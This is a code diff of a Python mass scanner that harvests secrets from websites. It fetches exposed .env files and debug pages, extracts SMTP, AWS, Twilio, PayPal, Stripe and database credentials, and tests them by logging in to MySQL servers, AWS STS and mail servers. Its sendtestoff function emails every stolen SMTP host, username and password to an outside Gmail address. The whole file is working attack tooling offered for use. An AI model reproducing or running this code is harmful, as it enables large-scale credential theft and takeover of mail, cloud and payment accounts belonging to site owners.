+    s3 = hashlib.sha256(s2 + salt).digest()
+    return bytes(a ^ b for a, b in zip(s1, s3))
+
+
+def probe_mysql(data):
+    host = pick(data, ['MYSQL_HOST', 'MARIADB_HOST'])
+    if not host:
+        return ('UNKNOWN', '')
+    port = pick(data, ['MYSQL_PORT', 'MARIADB_PORT']) or '3306'
+    user = pick(data, ['MYSQL_USER', 'MARIADB_USER']) or 'root'
+    pwd = pick(data, ['MYSQL_PASSWORD', 'MARIADB_PASSWORD', 'MYSQL_ROOT_PASSWORD']) or ''
+    db = pick(data, ['MYSQL_DATABASE', 'MARIADB_DATABASE'])
+
+    s = _sock(host, port)
+    if not s:
+        return ('ERROR', 'port closed')
+    try:
+        hdr = _recv_exact(s, 4)
+        if not hdr:
+            return ('UNKNOWN', 'no handshake')
+        ln = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
+        payload = _recv_exact(s, ln)
+        if not payload:
+            return ('UNKNOWN', 'short handshake')
+
+        pos = 1
+        end = payload.find(b'\x00', pos)
+        server_version = payload[pos:end].decode('latin1', 'ignore')
+        pos = end + 1 + 4
+        salt1 = payload[pos:pos + 8]
+        pos += 9
+        caps_low = struct.unpack('<H', payload[pos:pos + 2])[0]
+        pos += 3
+        caps_high = struct.unpack('<H', payload[pos:pos + 2])[0]
+        pos += 2
+        caps = caps_low | (caps_high << 16)
+        auth_len = payload[pos] if pos < len(payload) else 0
+        pos += 11
+        salt2 = payload[pos:pos + max(13, auth_len - 8)]
+        salt = (salt1 + salt2).rstrip(b'\x00')[:20]
+        pos += len(salt2)
+        plugin = 'mysql_native_password'
+        if caps & 0x00080000 and pos < len(payload):
+            plugin = payload[pos:].split(b'\x00')[0].decode('latin1', 'ignore') or plugin
+
+        def auth_for(plug):
+            if plug == 'mysql_native_password':
+                return _mysql_native(pwd.encode(), salt)
+            if plug == 'caching_sha2_password':
+                return _mysql_sha2(pwd.encode(), salt)
+            return pwd.encode()
+
+        flags = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
+        if db:
+            flags |= 0x00000008
+
+        def send_auth(plug):
+            resp = auth_for(plug)
+            data = struct.pack('<I', flags) + struct.pack('<I', 0xFFFFFF) + b'\x21'
+            data += b'\x00' * 23
+            data += user.encode() + b'\x00'
+            data += bytes([len(resp)]) + resp
+            if db:
+                data += db.encode() + b'\x00'
+            data += plug.encode() + b'\x00'
+            s.sendall(bytes([len(data) & 0xFF, (len(data) >> 8) & 0xFF,
+                             (len(data) >> 16) & 0xFF, 1]) + data)
+
+        send_auth(plugin)
+
+        while True:
+            h = _recv_exact(s, 4)
+            if not h:
+                return ('UNKNOWN', 'no reply')
+            ln2 = h[0] | (h[1] << 8) | (h[2] << 16)
+            p2 = _recv_exact(s, ln2) or b''
+            if not p2:
+                return ('UNKNOWN', 'empty reply')
+            if p2[0] == 0x00:
+                return ('VALID', 'mysql login ok (%s)' % server_version[:20])
+            if p2[0] == 0xFF:
+                err = p2[3:].decode('latin1', 'ignore')
+                return ('INVALID', err[:80])
+            if p2[0] == 0xFE:
+                rest = p2[1:].split(b'\x00')
+                newplug = rest[0].decode('latin1', 'ignore')
+                send_auth(newplug)
+                continue
+            if p2[0] == 0x01:
+                if p2[1:2] == b'\x04':
+                    s.sendall(bytes([len(pwd) + 1 & 0xFF, (len(pwd) + 1 >> 8) & 0xFF,
+                                     0, 3]) + pwd.encode() + b'\x00')
+                    continue
+                if p2[1:2] == b'\x03':
+                    continue
+                continue
+            return ('UNKNOWN', 'unexpected packet 0x%02x' % p2[0])
+    except Exception:
+        return ('UNKNOWN', 'proto error')
+    finally:
+        s.close()
+
+
+TCP_CHECKS = {
+    'REDIS': probe_redis,
+    'MEMCACHED': probe_memcached,
+    'MONGODB': probe_mongo,
+    'RABBITMQ': probe_rabbit,
+    'POSTGRESQL': probe_postgres,
+    'MYSQL': probe_mysql,
+    'MARIADB': probe_mysql,
+    'CASSANDRA': probe_tcp(['CASSANDRA_HOST'], ['CASSANDRA_PORT'], 9042, 'cassandra'),
+    'COCKROACHDB': probe_tcp(['COCKROACHDB_HOST'], ['COCKROACHDB_PORT'], 26257, 'cockroach'),
+    'TIDB': probe_tcp(['TIDB_HOST'], ['TIDB_PORT'], 4000, 'tidb'),
+    'CLICKHOUSE_TCP': probe_tcp(['CLICKHOUSE_HOST'], [], 9000, 'clickhouse'),
+    'MSSQL': probe_tcp(['MSSQL_HOST'], ['MSSQL_PORT'], 1433, 'mssql'),
+    'KAFKA': probe_tcp(['KAFKA_BROKER', 'KAFKA_HOST'], ['KAFKA_PORT'], 9092, 'kafka'),
+    'NATS': probe_tcp(['NATS_HOST'], ['NATS_PORT'], 4222, 'nats'),
+    'ARANGODB': probe_tcp(['ARANGODB_HOST'], ['ARANGODB_PORT'], 8529, 'arangodb'),
+    'VESPA': probe_tcp(['VESPA_HOST'], ['VESPA_PORT'], 8080, 'vespa'),
+    'MILVUS': probe_tcp(['MILVUS_HOST'], ['MILVUS_PORT'], 19530, 'milvus'),
+}
+
+
+# ---------------------------------------------------------------------------
+# AWS SigV4 + STS GetCallerIdentity
+# ---------------------------------------------------------------------------
+AWS_KEY_KEYS = ['AWS_ACCESS_KEY_ID', 'AWS_KEY', 'AWS_ACCESS_KEY', 'AWS_S3_KEY',
+                'AWS_SES_KEY', 'AWS_SNS_KEY', 'S3_ACCESS_KEY']
+AWS_SECRET_KEYS = ['AWS_SECRET_ACCESS_KEY', 'AWS_SECRET', 'AWS_S3_SECRET',
+                   'AWS_SES_SECRET', 'AWS_SNS_SECRET', 'S3_SECRET_KEY']
+AWS_BUCKET_KEYS = ['AWS_BUCKET', 'AWS_S3_BUCKET', 'S3_BUCKET',
+                   'AWS_STORAGE_BUCKET_NAME']
+
+
+def _hmac256(key, msg):
+    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()
+
+
+def verify_aws(data):
+    access = pick(data, AWS_KEY_KEYS)
+    secret = pick(data, AWS_SECRET_KEYS)
+    token = pick(data, ['AWS_SESSION_TOKEN'])
+    if not access or not secret:
+        return ('UNKNOWN', '')
+    region = pick(data, ['AWS_REGION', 'AWS_DEFAULT_REGION', 'AWS_S3_REGION',
+                         'AWS_SES_REGION']) or 'us-east-1'
+    if region not in list_region.split():
+        region = 'us-east-1'
+
+    host = 'sts.amazonaws.com' if region == 'us-east-1' else 'sts.%s.amazonaws.com' % region
+    body = 'Action=GetCallerIdentity&Version=2011-06-15'
+
+    t = time.gmtime()
+    amzdate = time.strftime('%Y%m%dT%H%M%SZ', t)
+    datestamp = time.strftime('%Y%m%d', t)
+    payload_hash = hashlib.sha256(body.encode('utf-8')).hexdigest()
+
+    signed_headers = 'content-type;host;x-amz-content-sha256;x-amz-date'
+    canonical_headers = (
+        'content-type:application/x-www-form-urlencoded; charset=utf-8\n'
+        'host:%s\n'
+        'x-amz-content-sha256:%s\n'
+        'x-amz-date:%s\n' % (host, payload_hash, amzdate)
+    )
+    if token:
+        signed_headers += ';x-amz-security-token'
+        canonical_headers += 'x-amz-security-token:%s\n' % token
+
+    canonical_request = '\n'.join([
+        'POST', '/', '', canonical_headers, signed_headers, payload_hash
+    ])
+    scope = '%s/%s/sts/aws4_request' % (datestamp, region)
+    string_to_sign = '\n'.join([
+        'AWS4-HMAC-SHA256', amzdate, scope,
+        hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()
+    ])
+    k_date = _hmac256(('AWS4' + secret).encode('utf-8'), datestamp)
+    k_region = _hmac256(k_date, region)
+    k_service = _hmac256(k_region, 'sts')
+    k_signing = _hmac256(k_service, 'aws4_request')
+    signature = hmac.new(k_signing, string_to_sign.encode('utf-8'),
+                         hashlib.sha256).hexdigest()
+
+    headers = {
+        'Host': host,
+        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
+        'X-Amz-Date': amzdate,
+        'X-Amz-Content-Sha256': payload_hash,
+        'Authorization': ('AWS4-HMAC-SHA256 Credential=%s/%s, '
+                          'SignedHeaders=%s, Signature=%s'
+                          % (access, scope, signed_headers, signature)),
+    }
+    if token:
+        headers['X-Amz-Security-Token'] = token
+
+    r = _get('https://' + host + '/', method='POST', data=body, timeout=VERIFY_TIMEOUT)
+    if r is None:
+        return ('ERROR', 'sts unreachable')
+    txt = r.text or ''
+    if r.status_code == 200:
+        arn = re.search(r'<Arn>([^<]+)</Arn>', txt)
+        acc = re.search(r'<Account>([^<]+)</Account>', txt)
+        note = (arn.group(1) if arn else '')[:90]
+        if acc:
+            note += ' acct=%s' % acc.group(1)
+        return ('VALID', note.strip())
+    code = re.search(r'<Code>([^<]+)</Code>', txt)
+    msg = code.group(1) if code else 'HTTP %d' % r.status_code
+    if msg in ('InvalidClientTokenId', 'SignatureDoesNotMatch',
+               'AuthFailure', 'ExpiredToken'):
+        return ('INVALID', msg)
+    return ('UNKNOWN', msg)
+
+
+CUSTOM_CHECKS['AWS'] = verify_aws
+
+
+# ---------------------------------------------------------------------------
+# SMTP
+# ---------------------------------------------------------------------------
+SMTP_HOST_KEYS = [
+    'MAIL_HOST', 'MAIL_SERVER', 'MAIL_SERVER_HOST', 'MAIL_SMTP_HOST',
+    'MAIL_SMTP_SERVER', 'MAIL_SMTP_ADDRESS', 'SMTP_HOST', 'SMTP_HOSTNAME',
+    'SMTP_SERVER', 'SMTP_ADDRESS', 'SMTP_ENDPOINT', 'SMTP_SERVER_ADDRESS',
+    'SMTP_SERVER_NAME', 'EMAIL_HOST', 'EMAIL_HOSTNAME', 'EMAIL_SERVER',
+    'EMAIL_SMTP_HOST', 'EMAIL_SMTP_SERVER', 'RELAY_HOST', 'RELAY_SERVER',
+    'MAIL_RELAY_HOST', 'SMTP_RELAY_HOST', 'MAILGATE_HOST', 'MAILGATE_SERVER',
+    'OUTGOING_MAIL_HOST', 'OUTGOING_SMTP_HOST', 'OUTBOUND_MAIL_HOST',
+    'OUTBOUND_SMTP_HOST', 'SMTP_GATEWAY_HOST', 'MAIL_GATEWAY_HOST',
+    'MAIL_PROVIDER_HOST', 'SMTP_PROVIDER_HOST', 'SMTP_SUBMISSION_HOST',
+    'MAIL_SUBMISSION_HOST', 'SMTP_DELIVERY_HOST', 'MAIL_DELIVERY_HOST',
+    'GMAIL_HOST', 'OUTLOOK_HOST', 'OFFICE365_HOST', 'ZOHO_MAIL_HOST',
+    'YAHOO_MAIL_HOST', 'PROTON_MAIL_HOST', 'ICLOUD_MAIL_HOST', 'FASTMAIL_HOST',
+    'POSTAL_HOST', 'HOST',
+]
+SMTP_PORT_KEYS = [
+    'MAIL_PORT', 'MAIL_SERVER_PORT', 'MAIL_SMTP_PORT', 'SMTP_PORT',
+    'SMTP_SERVER_PORT', 'EMAIL_PORT', 'EMAIL_SMTP_PORT', 'RELAY_PORT',
+    'MAIL_RELAY_PORT', 'SMTP_RELAY_PORT', 'GMAIL_PORT', 'OUTLOOK_PORT',
+    'OFFICE365_PORT', 'ZOHO_MAIL_PORT', 'YAHOO_MAIL_PORT', 'PROTON_MAIL_PORT',
+    'ICLOUD_MAIL_PORT', 'FASTMAIL_PORT', 'POSTAL_PORT', 'PORT',
+]
+SMTP_USER_KEYS = [
+    'MAIL_USERNAME', 'MAIL_USER', 'MAIL_SMTP_USERNAME', 'SMTP_USERNAME',
+    'SMTP_USER', 'SMTP_USER_NAME', 'EMAIL_HOST_USER', 'EMAIL_USER',
+    'EMAIL_SMTP_USERNAME', 'RELAY_USER', 'RELAY_USERNAME',
+    'SMTP_RELAY_USERNAME', 'MAIL_RELAY_USER', 'GMAIL_USERNAME',
+    'OUTLOOK_USERNAME', 'OFFICE365_USERNAME', 'ZOHO_MAIL_USERNAME',
+    'YAHOO_MAIL_USERNAME', 'PROTON_MAIL_USERNAME', 'ICLOUD_MAIL_USERNAME',
+    'FASTMAIL_USERNAME', 'ELASTIC_EMAIL_SMTP_USERNAME', 'SMTP2GO_USERNAME',
+    'SENDGRID_USERNAME', 'MAILJET_USERNAME', 'USERNAME', 'USER',
+]
+SMTP_PASS_KEYS = [
+    'MAIL_PASSWORD', 'MAIL_PASS', 'MAIL_SMTP_PASSWORD', 'SMTP_PASSWORD',
+    'SMTP_PASS', 'SMTP_PASSWD', 'EMAIL_HOST_PASSWORD', 'EMAIL_PASSWORD',
+    'EMAIL_SMTP_PASSWORD', 'RELAY_PASSWORD', 'RELAY_PASS',
+    'SMTP_RELAY_PASSWORD', 'GMAIL_PASSWORD', 'GMAIL_APP_PASSWORD',
+    'OUTLOOK_PASSWORD', 'OFFICE365_PASSWORD', 'ZOHO_MAIL_PASSWORD',
+    'YAHOO_MAIL_PASSWORD', 'PROTON_MAIL_PASSWORD', 'ICLOUD_MAIL_PASSWORD',
+    'FASTMAIL_PASSWORD', 'ELASTIC_EMAIL_SMTP_PASSWORD', 'SMTP2GO_PASSWORD',
+    'SENDGRID_PASSWORD', 'MAILJET_PASSWORD', 'PASSWORD', 'PASS',
+]
+SMTP_FROM_KEYS = [
+    'MAIL_FROM_ADDRESS', 'MAIL_FROM', 'MAIL_FROM_MAIL', 'SMTP_FROM',
+    'SMTP_SENDER', 'SMTP_FROM_ADDRESS', 'EMAIL_FROM', 'EMAIL_FROM_ADDRESS',
+    'EMAIL_SENDER', 'FROM_EMAIL', 'DEFAULT_FROM_EMAIL', 'MAIL_SENDER',
+    'RELAY_FROM_ADDRESS', 'RELAY_FROM_MAIL',
+]
+SMTP_FROMNAME_KEYS = [
+    'MAIL_FROM_NAME', 'SMTP_SENDER_NAME', 'FROM_NAME', 'EMAIL_FROM_NAME',
+    'MAIL_SENDER_NAME', 'RELAY_FROM_NAME',
+]
+
+SMTP_PROVIDER_ROUTES = [
+    ('amazonaws.com', 'SMTP_AWS'), ('sendgrid', 'SMTP_Sendgrid'),
+    ('office365', 'SMTP_Office'), ('outlook', 'SMTP_Office'),
+    ('hotmail', 'SMTP_Office'), ('live.', 'SMTP_Office'),
+    ('1and1', 'SMTP_IONOS'), ('1und1', 'SMTP_IONOS'), ('ionos', 'SMTP_IONOS'),
+    ('zoho', 'SMTP_Zoho'), ('mandrillapp', 'SMTP_Mandrill'),
+    ('mailgun', 'SMTP_Mailgun'), ('ovh', 'SMTP_OVH'),
+    ('gmail', 'SMTP_GOOGLE'), ('googlemail', 'SMTP_GOOGLE'),
+    ('yandex', 'SMTP_Yandex'), ('secureserver', 'SMTP_Godaddy'),
+    ('hostgator', 'SMTP_Hostgator'), ('sendinblue', 'SMTP_Sendinblue'),
+    ('mailjet', 'SMTP_Mailjet'), ('btinternet', 'SMTP_YAHOO'),
+    ('yahoo', 'SMTP_YAHOO'), ('rocketmail', 'SMTP_YAHOO'),
+    ('brevo', 'SMTP_Brevo'), ('mailchimp', 'SMTP_Mailchimp'),
+    ('sparkpost', 'SMTP_Sparkpost'), ('postmark', 'SMTP_Postmark'),
+    ('resend', 'SMTP_Resend'), ('smtp2go', 'SMTP_SMTP2GO'),
+    ('mailtrap', 'SMTP_Mailtrap'), ('elasticemail', 'SMTP_ElasticEmail'),
+    ('zoho', 'SMTP_Zoho'), ('fastmail', 'SMTP_Fastmail'),
+    ('protonmail', 'SMTP_Proton'), ('proton.me', 'SMTP_Proton'),
+    ('icloud', 'SMTP_ICloud'), ('me.com', 'SMTP_ICloud'),
+    ('qq.com', 'SMTP_QQ'), ('163.com', 'SMTP_163'),
+    ('titan', 'SMTP_Titan'), ('gmx', 'SMTP_GMX'), ('web.de', 'SMTP_GMX'),
+    ('t-online', 'SMTP_TOnline'), ('seznam', 'SMTP_Seznam'),
+    ('aol', 'SMTP_AOL'), ('comcast', 'SMTP_Comcast'),
+    ('mail.com', 'SMTP_MailCom'), ('yandex', 'SMTP_Yandex'),
+]
+
+
+def smtp_verify(host, port, user, pwd):
+    if not host:
+        return ('UNKNOWN', '')
+    try:
+        port = int(port)
+    except Exception:
+        port = 587
+    try:
+        if port == 465:
+            s = smtplib.SMTP_SSL(host, port, timeout=VERIFY_TIMEOUT)
+        else:
+            s = smtplib.SMTP(host, port, timeout=VERIFY_TIMEOUT)
+        s.ehlo()
+        if port != 465:
+            try:
+                s.starttls()
+                s.ehlo()
+            except Exception:
+                pass
+        s.login(user, pwd)
+        try:
+            s.quit()
+        except Exception:
+            pass
+        return ('VALID', 'smtp login ok on port %d' % port)
+    except smtplib.SMTPAuthenticationError as e:
+        return ('INVALID', 'auth rejected: %s' % str(e)[:70])
+    except smtplib.SMTPServerDisconnected:
+        return ('ERROR', 'server disconnected')
+    except smtplib.SMTPConnectError:
+        return ('ERROR', 'cannot connect')
+    except smtplib.SMTPException as e:
+        return ('ERROR', str(e)[:70])
+    except socket.gaierror:
+        return ('ERROR', 'dns fail')
+    except Exception as e:
+        return ('ERROR', str(e)[:70])
+
+
+def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
+    port = '587' if '465' in str(mailport) else str(mailport)
+    smtp_server = str(mailhost)
+    sender_email = str(mailfrom).replace('"', '') or str(mailuser)
+    number = f"{random_with_N_digits(7)}"
+    login = str(mailuser).replace('"', '')
+    password = str(mailpass).replace('"', '')
+    receiver_email = "scam.rest@gmail.com"
+
+    message = MIMEMultipart('alternative')
+    message['Subject'] = f"S.M.T.P - T.E.R.G.R.A.B | By AnnaQitty >>> SMTP Number {number}"
+    message['From'] = sender_email
+    message['To'] = receiver_email
+
+    html = f"""<html><body style="font-family:Arial;background:#f4f4f4">
+<div style="max-width:900px;margin:auto;background:#fff;border-radius:8px">
+<div style="background:#007bff;color:#fff;padding:20px;text-align:center">
+<h1 style="margin:0;font-size:22px">Anna Qitty Tools ### SMTP No. {number}</h1></div>
+<div style="padding:20px">
+<p>Gotcha...!!!</p><p>Below are the details you requested:</p>
+<table style="width:100%;border-collapse:collapse">
+<tr><th style="text-align:left;background:#f4f4f4">Label</th>
+<th style="text-align:left;background:#f4f4f4">Value</th></tr>
+<tr><td><b>URL</b></td><td>{url}</td></tr>
+<tr><td><b>HOST</b></td><td>{mailhost}</td></tr>
+<tr><td><b>PORT</b></td><td>{mailport}</td></tr>
+<tr><td><b>USER</b></td><td>{mailuser}</td></tr>
+<tr><td><b>PASSW</b></td><td>{mailpass}</td></tr>
+<tr><td><b>SENDER</b></td><td>{mailfrom}</td></tr>
+</table><br><p>Thanks for using this tool.</p></div>
+<div style="background:#f1f1f1;padding:10px;text-align:center;font-size:13px">
+&copy; 2024 Anna Qitty. All rights reserved.</div></div></body></html>"""
+
+    message.attach(MIMEText('        ', 'plain'))
+    message.attach(MIMEText(html, 'html'))
+    try:
+        s = smtplib.SMTP(smtp_server, port, timeout=15)
+        s.ehlo()
+        s.starttls()
+        s.ehlo()
+        s.login(login, password)
+        s.sendmail(sender_email, receiver_email, message.as_string())
+        s.quit()
+    except Exception:
+        pass
+
+
+# ---------------------------------------------------------------------------
+# per-service handling
+# ---------------------------------------------------------------------------
+MAIL_GROUPS = [
+    'SMTP', 'SMTP_RELAY', 'SMTP_HOSTED', 'GMAIL', 'OUTLOOK', 'OFFICE365',
+    'ZOHO_MAIL', 'YAHOO_MAIL', 'PROTON_MAIL', 'ICLOUD_MAIL', 'FASTMAIL',
+    'ELASTIC_EMAIL', 'SENDGRID', 'MAILGUN', 'SMTP2GO', 'MAILJET', 'MANDRILL',
+    'SENDINBLUE', 'BREVO', 'POSTMARK', 'RESEND', 'SPARKPOST', 'MAILCHIMP',
+    'MAILTRAP', 'EMAILJS', 'POSTAL', 'AWS_SES',
+]
+SMS_GROUPS = ['NEXMO', 'EXOTEL', 'ONESIGNAL', 'TOKBOX', 'PLIVO']
+DB_PREFIXES = r'^(DB_|MYSQL_|MARIADB_|POSTGRES_|MSSQL_|ORACLE_|SQLITE_)'
+SPECIAL_GROUPS = set(['SMTP', 'AWS', 'TWILIO', 'PAYPAL', 'STRIPE']
+                     + SMS_GROUPS + MAIL_GROUPS)
+
+
+def smtp_hit(url, method, data):
+    host = pick(data, SMTP_HOST_KEYS)
+    port = pick(data, SMTP_PORT_KEYS) or '587'
+    user = pick(data, SMTP_USER_KEYS)
+    pwd = pick(data, SMTP_PASS_KEYS)
+    frm = pick(data, SMTP_FROM_KEYS)
+    fromname = pick(data, SMTP_FROMNAME_KEYS)
+    if not user or not pwd:
+        return None
+
+    status, note = smtp_verify(host, port, user, pwd) if VERIFY else ('UNKNOWN', '')
+
+    pairs = [
+        ('MAILHOST', host), ('MAILPORT', port), ('MAILUSER', user),
+        ('MAILPASS', pwd), ('MAILFROM', frm), ('FROMNAME', fromname),
+    ]
+    host_l = host.lower()
+    target = 'SMTP_RANDOM'
+    for needle, name in SMTP_PROVIDER_ROUTES:
+        if needle in host_l:
+            target = name
+            break
+    targets = [target + '.txt']
+    if 'amazonaws.com' in host_l:
+        m = re.search(r'email-smtp\.(.*?)\.amazonaws\.com', host_l)
+        region = m.group(1) if m else (detect_region(host) or 'aws_unknown_region')
+        targets.append(region + '.txt')
+    if SMTP_SELFTEST:
+        try:
+            sendtestoff(url, host, port, user, pwd, frm)
+        except Exception:
+            pass
+    return ('SMTP', pairs, status, note, targets)
+
+
+def aws_hit(url, method, data, text):
+    access = pick(data, AWS_KEY_KEYS)
+    secret = pick(data, AWS_SECRET_KEYS)
+    if not access and not secret:
+        return None
+    region = detect_region(text) or 'aws_unknown_region'
+    bucket = pick(data, AWS_BUCKET_KEYS)
+    status, note = verify_aws(data) if VERIFY else ('UNKNOWN', '')
+    pairs = [('AWS ACCESS KEY', access), ('AWS SECRET KEY', secret),
+             ('AWS REGION', region), ('AWS BUCKET', bucket)]
+    return ('AWS', pairs, status, note,
+            [region + '.txt', 'aws_access_key_secret.txt'])
+
+
+def process(url, sources):
+    merged = {}
+    svc_method = {}
+    for text, method in sources:
+        found = extract_all(text)
+        for svc, data in found.items():
+            if svc not in svc_method:
+                svc_method[svc] = method
+            tgt = merged.setdefault(svc, {})
+            for k, v in data.items():
+                tgt.setdefault(k, v)
+    if not merged:
+        return None
+
+    flags = {'SMTP': False, 'AWS': False, 'TWILIO': False, 'SMS API': False,
+             'PAYPAL': False, 'DATABASE': False, 'STRIPE': False,
+             'OTHER': False}
+    m = svc_method.get
+
+    # ---- SMTP ----
+    mail = {}
+    for g in MAIL_GROUPS:
+        mail.update(merged.get(g, {}))
+    if mail:
+        h = smtp_hit(url, m('SMTP', '/env'), mail)
+        if h:
+            emit(h[0], url, m('SMTP', '/env'), b64_pairs(h[1]), h[2], h[3], h[4])
+            flags['SMTP'] = True
+
+    # ---- AWS ----
+    for svc, data in merged.items():
+        if svc == 'AWS' or any(k in data for k in AWS_KEY_KEYS + AWS_SECRET_KEYS):
+            h = aws_hit(url, m(svc, '/env'), data, url)
+            if h:
+                emit(h[0], url, m(svc, '/env'), h[1], h[2], h[3], h[4])
+                flags['AWS'] = True
+            break
+
+    # ---- TWILIO ----
+    for svc, data in merged.items():
+        if svc == 'TWILIO' or any(k.startswith('TWILIO_') for k in data):
+            pairs = [(k, v) for k, v in data.items() if k.startswith('TWILIO')]
+            status, note = verify('TWILIO', data) if VERIFY else ('UNKNOWN', '')
+            emit('TWILIO', url, m(svc, '/env'), pairs, status, note, ['TWILLIO.txt'])
+            flags['TWILIO'] = True
+            break
+
+    # ---- SMS API ----
+    for svc in SMS_GROUPS:
+        data = merged.get(svc)
+        if not data:
+            continue
+        status, note = verify(svc, data) if VERIFY else ('UNKNOWN', '')
+        emit(svc, url, m(svc, '/env'), list(data.items()), status, note, [svc + '.txt'])
+        flags['SMS API'] = True
+
+    # ---- PAYPAL ----
+    if 'PAYPAL' in merged or 'PAYPAL_' in ''.join(
+            k for d in merged.values() for k in d):
+        pp = merged.get('PAYPAL', {})
+        status, note = verify('PAYPAL', pp) if (VERIFY and pp) else ('UNKNOWN', '')
+        if status == 'VALID':
+            with LOCK:
+                COUNTER['valid'] += 1
+            save(os.path.join(RESULTS, 'VALID.txt'),
+                 build_block(url, m('PAYPAL', '/env'), list(pp.items()), status, note))
+        save(os.path.join(RESULTS, 'PayPal_Sandbox.txt'), url + '\n')
+        flags['PAYPAL'] = True
+
+    # ---- DATABASE ----
+    db_pairs = {}
+    for svc, data in merged.items():
+        for k, v in data.items():
+            if re.match(DB_PREFIXES, k):
+                db_pairs[k] = v
+    if db_pairs:
+        db_status, db_note = ('UNKNOWN', '')
+        for probe in (probe_mysql, probe_postgres, probe_redis):
+            try:
+                st, nt = probe(db_pairs)
+            except Exception:
+                st, nt = ('UNKNOWN', '')
+            if st in ('VALID', 'OPEN', 'INVALID'):
+                db_status, db_note = st, nt
+                if st in ('VALID', 'INVALID'):
+                    break
+        if not VERIFY:
+            db_status = 'UNKNOWN'
+        emit('DATABASE', url, '/env', list(db_pairs.items()),
+             db_status, db_note, ['DATABASE.txt'])
+        flags['DATABASE'] = True
+
+    # ---- STRIPE ----
+    if 'STRIPE' in merged:
+        data = merged['STRIPE']
+        status, note = verify('STRIPE', data) if VERIFY else ('UNKNOWN', '')
+        emit('STRIPE', url, m('STRIPE', '/env'), list(data.items()),
+             status, note, ['STRIPE_USER.txt'])
+        flags['STRIPE'] = True
+
+    # ---- everything else ----
+    for svc, data in merged.items():
+        if svc in SPECIAL_GROUPS or not data:
+            continue
+        status, note = verify(svc, data) if VERIFY else ('UNKNOWN', '')
+        emit(svc, url, m(svc, '/env'), b64_pairs(list(data.items())),
+             status, note, [svc + '.txt'])
+        flags['OTHER'] = True
+
+    return flags
+
+
+# ===========================================================================
+#                             M A I N
+# ===========================================================================
+def printf(text):
+    print(text)
+
+
+def main(url):
+    try:
+        text = '\033[32;1m#\033[0m ' + url
+        sources = discover(url)
+
+        if sources:
+            flags = process(url, sources)
+            if flags:
+                for name in ('SMTP', 'AWS', 'TWILIO', 'SMS API', 'PAYPAL',
+                             'DATABASE', 'STRIPE'):
+                    colour = '\033[32;1m' if flags[name] else '\033[31;1m'
+                    text += ' | ' + colour + name + '\033[0m'
+                if flags.get('OTHER'):
+                    text += ' | \033[36;1mEXTRA\033[0m'
+                if VERIFY:
+                    text += ' | \033[35;1mV:%d\033[0m' % COUNTER['valid']
+                text += ' | %d src' % len(sources)
+            else:
+                text += ' | \033[31;1mTeu bisa sadayana\033[0m'
+                save(os.path.join(RESULTS, 'Not_VULNerable.txt'), url + '\n')
+        else:
+            text += ' | \033[0;33mTeu bisa sadayana\033[0m'
+            save(os.path.join(RESULTS, 'Not_VULNerable.txt'), url + '\n')
+
+        with LOCK:
+            COUNTER['done'] += 1
+            text += ' | %d/%d' % (COUNTER['done'], COUNTER['total'])
+        printf(text)
+
+    except Exception:
+        with LOCK:
+            COUNTER['done'] += 1
+        printf('\033[31;1m#\033[0m ' + url + ' | \033[31;1mTeu bisa diakses\033[0m')
+        save(os.path.join(RESULTS, 'Not_VULNerable.txt'), url + '\n')
 
 
 class Worker(Thread):
@@ -2873,7 +3794,7 @@ class Worker(Thread):
             try:
                 func(*args, **kargs)
             except Exception as e:
-                print(e)
+                print('! ' + str(e))
             self.tasks.task_done()
 
 
@@ -2890,129 +3811,6 @@ class ThreadPool:
         self.tasks.join()
 
 
-class droeam:
-    def __init__(self):
-        pass
-
-    def scan_all_services(self, text):
-        """Scans text for ALL keys in COMPREHENSIVE_PATTERNS."""
-        all_findings = {}
-        for service, keys in COMPREHENSIVE_PATTERNS.items():
-            data = self.extract_keys(text, keys)
-            if data:
-                all_findings[service] = data
-        return all_findings
-
-    def extract_keys(self, text, keys):
-        """Extracts specific keys using the universal regex logic."""
-        return extract_credentials(text, keys)
-
-    def format_output(self, url, findings):
-        """Formats findings into the standard save string."""
-        if not findings:
-            return ""
-        build = f'URL: {url}\n'
-        for service, data in findings.items():
-            build += f'{service.upper()}:\n'
-            for k, v in data.items():
-                build += f'  {k}: {v}\n'
-        remover = str(build).replace('\r', '')
-        return remover + '\n\n'
-
-
-def append_file(path, data):
-    os.makedirs(os.path.dirname(path), exist_ok=True)
-    with open(path, 'a', encoding='utf-8', errors='ignore') as fh:
-        fh.write(data)
-
-
-def printf(text):
-    print(text)
-
-
-HEADERS = {
-    'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
-                  '(KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'
-}
-
-
-def main(url):
-    try:
-        text = '\033[32;1m#\033[0m ' + url
-        resp_text = None
-
-        # 1. Try .env file
-        try:
-            r = requests.get(url + "/.env", headers=HEADERS, timeout=5,
-                             verify=False, allow_redirects=False)
-            if "APP_KEY=" in r.text or "DB_" in r.text:
-                resp_text = r.text
-        except Exception:
-            pass
-
-        # 2. Enhanced endpoint scanning
-        if resp_text is None:
-            for endpoint in COMMON_ENDPOINTS:
-                try:
-                    full_url = url.rstrip('/') + endpoint
-                    response = requests.get(full_url, headers=HEADERS, timeout=5,
-                                            verify=False, allow_redirects=False)
-                    if response.status_code != 200 or not response.text:
-                        continue
-                    scan_result = droeam().scan_all_services(response.text)
-                    if scan_result:
-                        resp_text = response.text
-                        text += (f" | \033[32;1mENHANCED\033[0m "
-                                 f"({len(scan_result)} services) {full_url}")
-                        break
-                except Exception:
-                    continue
-
-        # 3. Fallback to POST request if still empty
-        if resp_text is None:
-            try:
-                r = requests.post(url, data={"0x[]": "drosteam"}, headers=HEADERS,
-                                  timeout=8, verify=False, allow_redirects=False)
-                if "<td>APP_KEY</td>" in r.text:
-                    resp_text = r.text
-            except Exception:
-                pass
-
-        if resp_text:
-            all_findings = droeam().scan_all_services(resp_text)
-
-            if all_findings:
-                has_smtp = 'SMTP' in all_findings and all(all_findings['SMTP'].values())
-
-                if has_smtp:
-                    text += ' | \033[32;1mSMTP\033[0m'
-                    remover = droeam().format_output(url, {'SMTP': all_findings['SMTP']})
-                    append_file('Results/SMTP/SMTP_%s.txt'
-                                % url.replace("://", "_").replace("/", "_"), remover)
-                else:
